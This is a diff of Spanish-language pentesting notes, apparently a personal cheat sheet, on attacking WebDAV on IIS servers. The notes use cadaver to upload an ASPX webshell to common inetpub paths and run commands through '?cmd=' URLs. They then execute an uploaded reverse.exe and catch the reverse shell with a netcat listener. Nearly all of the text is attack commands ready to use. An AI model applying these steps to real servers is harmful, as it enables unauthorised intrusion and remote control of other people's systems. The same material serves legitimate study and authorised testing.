@@ -65,10 +65,21 @@ NOTA:
 ## Cadaver forma 1 - Revershell 
 
 ```bash 
-❯ cadaver http://IP/webdav   # Conectarse al WebDav 
+❯ cadaver http://IP/          # Conectarse al WebDav 
+❯ cadaver http://IP/webdav    # Otra forma de conectarse 
+
 	❯ ?       # Mostrar los comandos disponibles 
-	❯ put webshell.aspx      # Subir una webshell (Colocar la ruta)
+	❯ put webshell.aspx    # Subir una webshell (Colocar la ruta)
 	❯ exit    # Salir 
+
+
+NOTA:
+	- Rutas comunes donde subir el archivo en IIS
+		C:\inetpub\wwwroot\  
+		# Raíz del servidor web → Acceder desde http://IP/cmd.aspx
+		
+		C:\inetpub\wwwroot\uploads\  
+		# Acceder desde http://IP/uploads/cmd.aspx
 
 
 # Ejecutar un comando despues de subir la webshell 
@@ -109,7 +120,9 @@ NOTA:
 ## Cadaver forma 2 - Revershell 
 
 ```bash 
-❯ cadaver http://IP/webdav   # Conectarse al WebDav 
+❯ cadaver http://IP/          # Conectarse al WebDav 
+❯ cadaver http://IP/webdav    # Otra forma de conectarse 
+
 	❯ ?       # Mostrar los comandos disponibles 
 	❯ put webshell.aspx      # Subir una webshell (Colocar la ruta)
 	❯ exit    # Salir 
@@ -136,7 +149,7 @@ NOTA:
 ```
 
 ```bash 
-# Revershell (Forma 2)
+# Revershell
 # Se sube este archivo y se ejecuta desde la web 
 
 # Creación de una Revershell stageless 
@@ -159,10 +172,11 @@ NOTA:
 
 ```bash 
 # REVERSHELL
+# Verificar si el archivo se ha subido 
+	http://IP/webshell.aspx?cmd=dir C:\inetpub\wwwroot\           
 
-# Ejecutar un comando despues de subir la webshell 
-	http://IP/webshell.aspx?cmd=dir C:\inetpub\wwwroot\           # Verificar si el archivo se ha subido 
-	http://IP/webshell.aspx?cmd=C:\inetpub\wwwroot\reverse.exe    # Ejecutar el comando
+# Ejecutar el comando para enviar la Revershell 
+	http://IP/webshell.aspx?cmd=C:\inetpub\wwwroot\reverse.exe    
 
 ❯ rlwrap nc -nlvp 593    # Recibir la Revershell 
 ```
